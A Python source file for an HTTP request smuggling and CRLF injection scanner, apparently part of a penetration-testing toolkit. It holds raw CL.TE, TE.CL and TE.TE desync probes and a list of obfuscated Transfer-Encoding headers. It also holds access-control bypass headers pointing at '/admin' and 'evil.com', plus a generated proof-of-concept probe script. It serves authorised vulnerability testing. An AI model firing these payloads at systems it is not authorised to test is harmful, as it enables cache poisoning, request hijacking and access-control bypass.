
from __future__ import annotations

import re
import time
import socket
import ssl
import hashlib
from typing import Any
from urllib.parse import urlparse

import requests

from vapt.utils.helpers import sanitize_target


TE_OBFUSCATIONS = [
    "Transfer-Encoding: chunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    "Transfer-Encoding: chunked\r\nTransfer-encoding: identity",
    "Transfer-Encoding:\tchunked",
    "Transfer-Encoding: \tchunked",
    " Transfer-Encoding: chunked",
    "Transfer-Encoding: chunked\r\n",
    "Transfer-Encoding: CHUNKED",
    "Transfer-Encoding: Chunked",
    "Transfer-Encoding:\r\n chunked",
    "Transfer-Encoding: x]chunked",
    "Transfer-encoding: chunked",
    "TRANSFER-ENCODING: chunked",
    "X: X\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked",
    "Transfer-Encoding:chunked",
    "Transfer-Encoding: chunked\x00",
]


class SmuggleScanner:

    def __init__(
        self,
        session: requests.Session | None = None,
        timeout: int = 10,
    ) -> None:
        self.session = session or requests.Session()
        self.timeout = timeout
        self.findings: list[dict] = []

    def run(self, target: str) -> dict[str, Any]:
        target = sanitize_target(target)
        if not target.startswith("http"):
            target = f"https://{target}"

        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        infra = self._detect_infrastructure(target)

        self._test_cl_te(host, port, use_ssl, path, target, infra)

        self._test_te_cl(host, port, use_ssl, path, target, infra)

        self._test_te_te(host, port, use_ssl, path, target, infra)

        self._test_h2_downgrade(target, infra)

        self._test_crlf_splitting(target)

        return {"findings": self.findings}


    def _detect_infrastructure(self, target: str) -> dict[str, Any]:
        infra: dict[str, Any] = {
            "server": "unknown",
            "via": None,
            "cdn": None,
            "proxy": False,
            "http2": False,
        }

        try:
            resp = self.session.get(target, timeout=self.timeout)
            headers = resp.headers

            infra["server"] = headers.get("Server", "unknown")
            infra["via"] = headers.get("Via")
            infra["cdn"] = None

            cdn_headers = {
                "cf-ray": "Cloudflare",
                "x-cdn": "Generic CDN",
                "x-amz-cf-id": "CloudFront",
                "x-akamai-request-id": "Akamai",
                "x-fastly-request-id": "Fastly",
                "x-varnish": "Varnish",
                "x-cache": "Proxy Cache",
                "x-served-by": "CDN",
            }

            for header, name in cdn_headers.items():
                if header in headers:
                    infra["cdn"] = name
                    infra["proxy"] = True
                    break

            if infra["via"]:
                infra["proxy"] = True

            try:
                resp2 = self.session.get(target, timeout=self.timeout)
                if hasattr(resp2, 'raw') and hasattr(resp2.raw, 'version'):
                    infra["http2"] = resp2.raw.version == 20
            except Exception:
                pass

        except Exception:
            pass

        return infra


    def _send_raw(
        self,
        host: str,
        port: int,
        use_ssl: bool,
        data: bytes,
        recv_timeout: float = 10.0,
    ) -> tuple[bytes, float]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(recv_timeout)

        try:
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            start = time.time()
            sock.sendall(data)

            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 50000:
                        break
            except socket.timeout:
                pass

            elapsed = time.time() - start
            return response, elapsed

        except Exception as e:
            return b"ERROR: " + str(e).encode(), 0.0
        finally:
            try:
                sock.close()
            except Exception:
                pass


    def _test_cl_te(
        self,
        host: str,
        port: int,
        use_ssl: bool,
        path: str,
        target: str,
        infra: dict,
    ) -> None:
        normal_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"test=1"
        ).encode()

        _, baseline_time = self._send_raw(host, port, use_ssl, normal_req)
        if baseline_time == 0:
            return

        probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"
        ).encode()

        _, probe_time = self._send_raw(host, port, use_ssl, probe, recv_timeout=15.0)

        time_diff = probe_time - baseline_time

        if time_diff > 5.0:
            confidence = min(0.95, 0.7 + (time_diff - 5) * 0.05)
            self._add_finding(
                vuln_id="SMUG-001",
                title=f"CL.TE Request Smuggling Detected (Δ{time_diff:.1f}s)",
                severity="Critical",
                cvss=9.8,
                url=target,
                category="request_smuggling",
                evidence=(
                    f"Infrastructure: {infra.get('server')} (CDN: {infra.get('cdn', 'none')})\n"
                    f"Baseline timing: {baseline_time:.2f}s\n"
                    f"Probe timing: {probe_time:.2f}s\n"
                    f"Time differential: {time_diff:.2f}s\n"
                    f"Front-end uses Content-Length, back-end uses Transfer-Encoding\n"
                    f"The back-end waited for chunked data → desync confirmed"
                ),
                payload="POST with CL=4 + TE:chunked with incomplete chunk body",
                remediation=(
                    "Configure front-end to reject ambiguous requests. "
                    "Normalize Content-Length and Transfer-Encoding handling. "
                    "Use HTTP/2 end-to-end to eliminate smuggling vectors. "
                    "Reject requests with both CL and TE headers."
                ),
                confidence=confidence,
                poc=self._generate_smuggle_poc("CL.TE", target, host, path, time_diff, infra),
            )


    def _test_te_cl(
        self,
        host: str,
        port: int,
        use_ssl: bool,
        path: str,
        target: str,
        infra: dict,
    ) -> None:
        normal_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"test=1"
        ).encode()

        _, baseline_time = self._send_raw(host, port, use_ssl, normal_req)
        if baseline_time == 0:
            return

        probe = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"8\r\n"
            f"SMUGGLED\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        _, probe_time = self._send_raw(host, port, use_ssl, probe, recv_timeout=15.0)
        time_diff = probe_time - baseline_time

        if time_diff > 5.0:
            confidence = min(0.95, 0.7 + (time_diff - 5) * 0.05)
            self._add_finding(
                vuln_id="SMUG-002",
                title=f"TE.CL Request Smuggling Detected (Δ{time_diff:.1f}s)",
                severity="Critical",
                cvss=9.8,
                url=target,
                category="request_smuggling",
                evidence=(
                    f"Infrastructure: {infra.get('server')} (CDN: {infra.get('cdn', 'none')})\n"
                    f"Baseline timing: {baseline_time:.2f}s\n"
                    f"Probe timing: {probe_time:.2f}s\n"
                    f"Time differential: {time_diff:.2f}s\n"
                    f"Front-end uses Transfer-Encoding, back-end uses Content-Length\n"
                    f"Data after CL boundary is interpreted as a new request"
                ),
                payload="POST with TE:chunked + CL=3, actual chunked body is 'SMUGGLED'",
                remediation=(
                    "Configure back-end to prioritize TE over CL. "
                    "Use HTTP/2 end-to-end. "
                    "Reject requests containing both CL and TE. "
                    "Deploy consistent HTTP parsing across all layers."
                ),
                confidence=confidence,
                poc=self._generate_smuggle_poc("TE.CL", target, host, path, time_diff, infra),
            )


    def _test_te_te(
        self,
        host: str,
        port: int,
        use_ssl: bool,
        path: str,
        target: str,
        infra: dict,
    ) -> None:
        normal_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"x\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        resp_normal, baseline_time = self._send_raw(host, port, use_ssl, normal_req)
        if baseline_time == 0:
            return

        normal_status = self._extract_status(resp_normal)

        for te_variant in TE_OBFUSCATIONS:
            probe = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{te_variant}\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()

            resp_probe, probe_time = self._send_raw(host, port, use_ssl, probe, recv_timeout=12.0)
            probe_status = self._extract_status(resp_probe)
            time_diff = probe_time - baseline_time

            if (probe_status != normal_status and probe_status not in (0, 400)) or time_diff > 5.0:
                clean_te = te_variant.replace('\r\n', '\\r\\n').replace('\t', '\\t').replace('\x00', '\\x00')
                self._add_finding(
                    vuln_id="SMUG-003",
                    title=f"TE.TE Desync via Header Obfuscation",
                    severity="Critical",
                    cvss=9.5,
                    url=target,
                    category="request_smuggling",
                    evidence=(
                        f"Infrastructure: {infra.get('server')} (CDN: {infra.get('cdn', 'none')})\n"
                        f"TE Variant: {clean_te}\n"
                        f"Normal status: {normal_status}, Probe status: {probe_status}\n"
                        f"Normal timing: {baseline_time:.2f}s, Probe timing: {probe_time:.2f}s\n"
                        f"One server processed obfuscated TE, the other ignored it"
                    ),
                    payload=f"TE header variant: {clean_te}",
                    remediation=(
                        "Normalize Transfer-Encoding header parsing across all layers. "
                        "Reject requests with duplicate/malformed TE headers. "
                        "Use HTTP/2 end-to-end."
                    ),
                    confidence=0.80,
                    poc=self._generate_smuggle_poc("TE.TE", target, host, path, time_diff, infra),
                )
                return


    def _test_h2_downgrade(self, target: str, infra: dict) -> None:
        if not infra.get("proxy") and not infra.get("cdn"):
            return

        try:
            smuggle_headers = {
                "Transfer-Encoding": "chunked",
                "Content-Length": "0",
                "X-Forwarded-Host": "evil.com",
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin",
            }

            for header, value in smuggle_headers.items():
                resp = self.session.get(
                    target,
                    headers={header: value},
                    timeout=self.timeout,
                )

                if resp.status_code in (200, 301, 302, 403) and header in ("X-Original-URL", "X-Rewrite-URL"):
                    if resp.status_code != 404:
                        try:
                            normal = self.session.get(target, timeout=self.timeout)
                            if resp.status_code != normal.status_code or len(resp.text) != len(normal.text):
                                self._add_finding(
                                    vuln_id="SMUG-004",
                                    title=f"HTTP Request Routing Override via {header}",
                                    severity="High",
                                    cvss=8.0,
                                    url=target,
                                    category="request_smuggling",
                                    evidence=(
                                        f"Header: {header}: {value}\n"
                                        f"Normal response: {normal.status_code} ({len(normal.text)} bytes)\n"
                                        f"Override response: {resp.status_code} ({len(resp.text)} bytes)\n"
                                        f"Server honored the override header → bypasses access controls"
                                    ),
                                    payload=f"{header}: {value}",
                                    remediation=f"Block or strip {header} at the proxy/WAF level. Do not honor request override headers from clients.",
                                    confidence=0.85,
                                    poc=f"1. Send: curl -H '{header}: {value}' {target}\n"
                                        f"2. Response differs from normal request\n"
                                        f"3. Can access restricted paths by setting {header}: /admin",
                                )
                        except Exception:
                            pass
        except Exception:
            pass


    def _test_crlf_splitting(self, target: str) -> None:
        crlf_payloads = [
            "%0d%0aX-Injected: true",
            "%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost: evil.com",
            "\r\nX-Injected: true",
            "\\r\\nX-Injected: true",
            "%E5%98%8A%E5%98%8DX-Injected: true",
        ]

        try:
            test_points = [
                (f"{target}/%0d%0aX-Injected: true", "URL path"),
                (f"{target}?q=%0d%0aX-Injected: true", "Query parameter"),
            ]

            for test_url, location in test_points:
                try:
                    resp = self.session.get(
                        test_url, timeout=self.timeout, allow_redirects=False,
                    )

                    if "X-Injected" in str(resp.headers):
                        self._add_finding(
                            vuln_id="SMUG-005",
                            title=f"CRLF Injection / HTTP Response Splitting in {location}",
                            severity="High",
                            cvss=8.0,
                            url=test_url,
                            category="crlf_injection",
                            evidence=(
                                f"Location: {location}\n"
                                f"Payload: %0d%0aX-Injected: true\n"
                                f"Injected header found in response: X-Injected\n"
                                f"Response headers: {dict(resp.headers)}"
                            ),
                            payload="%0d%0aX-Injected: true",
                            remediation="Sanitize CRLF characters (\\r\\n) in all user-controlled values that reach HTTP headers. Use framework-level header encoding.",
                            confidence=0.95,
                            poc=f"1. Visit: {test_url}\n"
                                f"2. Check response headers for 'X-Injected: true'\n"
                                f"3. Can inject arbitrary headers → cache poisoning, XSS via Set-Cookie",
                        )
                        return
                except Exception:
                    continue
        except Exception:
            pass


    def _extract_status(self, response: bytes) -> int:
        try:
            first_line = response.split(b"\r\n")[0].decode()
            parts = first_line.split(" ")
            return int(parts[1]) if len(parts) >= 2 else 0
        except Exception:
            return 0

    def _generate_smuggle_poc(
        self,
        attack_type: str,
        target: str,
        host: str,
        path: str,
        time_diff: float,
        infra: dict,
    ) -> str:
        return f"""## HTTP Request Smuggling PoC ({attack_type})

- URL: {target}
- Server: {infra.get('server', 'unknown')}
- CDN/Proxy: {infra.get('cdn', 'none')}
- Time differential: {time_diff:.2f}s

Timing-based differential analysis:
- Normal request completes quickly
- Smuggling probe causes timeout (back-end waits for more data)

```
POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

- Request smuggling can bypass WAFs and access controls
- Poison web caches to serve malicious content to other users
- Hijack other users' requests
- Perform credential theft via request redirection

```python
import socket, ssl, time

def test_smuggle(host, port, path, use_ssl=True):
    sock = socket.socket()
    sock.settimeout(15)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    
    probe = (
        f"POST {{path}} HTTP/1.1\\r\\n"
        f"Host: {{host}}\\r\\n"
        f"Content-Length: 4\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"\\r\\n"
        f"1\\r\\nZ\\r\\nQ"
    ).encode()
    
    start = time.time()
    sock.sendall(probe)
    try:
        sock.recv(4096)
    except socket.timeout:
        pass
    elapsed = time.time() - start
    print(f"Response time: {{elapsed:.2f}}s")
    sock.close()

test_smuggle("{host}", {"443" if infra.get("cdn") else "80"}, "{path}")
```

1. Reject requests with both Content-Length and Transfer-Encoding
2. Use HTTP/2 end-to-end (eliminates this class entirely)
3. Configure proxy to normalize ambiguous requests
4. Deploy consistent HTTP parsing libraries across all layers
"""

    def _add_finding(self, **kwargs: Any) -> None:
        key = (kwargs.get("vuln_id"), kwargs.get("url"), kwargs.get("title", "")[:50])
        dedup = hashlib.md5(str(key).encode()).hexdigest()

        for existing in self.findings:
            if existing.get("_dedup") == dedup:
                return

        finding = {
            "vuln_id": kwargs.get("vuln_id", "SMUG-000"),
            "title": kwargs.get("title", ""),
            "severity": kwargs.get("severity", "Critical"),
            "cvss_score": kwargs.get("cvss", 9.0),
            "url": kwargs.get("url", ""),
            "category": kwargs.get("category", "request_smuggling"),
            "evidence": kwargs.get("evidence", ""),
            "payload": kwargs.get("payload", ""),
            "remediation": kwargs.get("remediation", ""),
            "confidence": kwargs.get("confidence", 0.8),
            "validated": True,
            "poc": kwargs.get("poc", ""),
            "request": kwargs.get("payload", ""),
            "scanner": "SmuggleScanner",
            "_dedup": dedup,
        }
        self.findings.append(finding)
